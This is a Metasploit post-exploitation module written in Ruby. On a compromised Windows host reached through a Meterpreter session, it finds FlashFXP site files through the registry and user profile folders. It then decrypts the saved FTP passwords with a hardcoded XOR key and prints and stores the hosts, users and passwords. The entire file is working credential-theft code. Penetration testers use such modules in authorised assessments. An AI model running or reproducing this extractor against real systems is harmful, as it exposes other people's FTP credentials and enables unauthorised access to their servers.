##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather FlashFXP Saved Password Extraction',
      'Description'   => %q{
        This module extracts weakly encrypted saved FTP Passwords  from FlashFXP. It
        finds saved FTP connections in the Sites.dat file. },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    #Checks if the Site data is stored in a generic location  for all users
    flash_reg = "HKLM\\SOFTWARE\\FlashFXP"
    flash_reg_ver = registry_enumkeys("#{flash_reg}")

    #Ini paths
    @fxppaths = []

    unless flash_reg_ver.nil?
        software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
        generic_path = registry_getvaldata(software_key, "InstallerDataPath") || ""
      unless generic_path.include? "%APPDATA%"
        @fxppaths << generic_path + "\\Sites.dat"
      end
    end

    grab_user_profiles().each do |user|
      next if user['AppData'] == nil
      tmpath= user['AppData'] + '\\FlashFXP\\'
      get_ver_dirs(tmpath)
    end

    @fxppaths.each do |fxp|
      get_ini(fxp)
    end
  end

  def get_ver_dirs(path)
    begin
      session.fs.dir.foreach(path) do |sub|
        next if sub =~ /^(\.|\.\.)$/
        @fxppaths << "#{path}#{sub}\\Sites.dat"
      end
    rescue
      print_error("The following path could not be accessed or does not exist: #{path}")
    end
  end

  def get_ini(filename)
    begin
      config = client.fs.file.new(filename,'r')
      parse = config.read
      ini = Rex::Parser::Ini.from_s(parse)

      if ini == {}
        print_error("Unable to parse file, may be encrypted using external password: #{filename}")
      end

      ini.each_key do |group|
        host = ini[group]['IP']
        username = ini[group]['user']
        epass = ini[group]['pass']
        port = ini[group]['port']
        next if epass == nil or epass == ""
        passwd = decrypt(epass)

        print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
        if session.db_record
          source_id = session.db_record.id
        else
          source_id = nil
        end
        report_auth_info(
          :host  => host,
          :port => port,
          :sname => 'ftp',
          :source_id => source_id,
          :source_type => "exploit",
          :user => username,
          :pass => passwd)
      end
    rescue
      print_status("Either could not find or could not open file #{filename}")
    end
  end

  def decrypt(pwd)
    key =  "yA36zA48dEhfrvghGRg57h5UlDv3"
    pass = ""
    cipher = [pwd].pack("H*")

    (0..(cipher.length)-2).each do |index|
      xored = cipher[index + 1,1].unpack("C").first ^ key[index,1].unpack("C").first
      if ((xored - cipher[index,1].unpack("C").first < 0))
        xored += 255
      end
      pass << (xored - cipher[index,1].unpack("C").first).chr
    end
    return pass
  end
end
